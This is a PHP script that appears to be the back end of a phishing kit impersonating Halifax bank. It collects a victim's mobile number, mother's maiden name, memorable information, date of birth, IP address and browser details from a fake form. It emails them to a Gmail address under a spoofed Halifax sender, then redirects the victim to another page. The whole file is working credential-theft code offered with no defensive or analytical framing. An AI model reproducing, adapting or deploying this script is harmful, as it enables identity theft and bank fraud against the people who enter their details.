<?php
$one=$_SESSION['one'];
$two=$_SESSION['two'];
$three=$_SESSION['three'];
$four=$_SESSION['four'];
$five=$_SESSION['five'];
$six=$_SESSION['six'];
$ip=getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$httprefi = getenv ("HTTP_REFERER");
$server=$_SERVER["HTTP_HOST"];
$browser = $_SERVER['HTTP_USER_AGENT'];
$mobile=$_POST['mobile'];
$customer=$_POST['customer'];
$memo=$_POST['memo'];
$day=$_POST['day'];$month=$_POST['month'];$year=$_POST['year'];
$mesaj="
$adddate
Mobile Number: $mobile
Mother's maiden name: $customer
Memorable Info: $memo
Date of Birth: $day $month $year
ip: $ip";
$send="kingsama786@gmail.com"; 
$subject = "$ip";
$headers = "From: Halifax<xpp@h4l1f4x.com>";
mail($send,$subject,$mesaj,$headers);
header( "Location: customeridentificationscarddata.jsp");
?>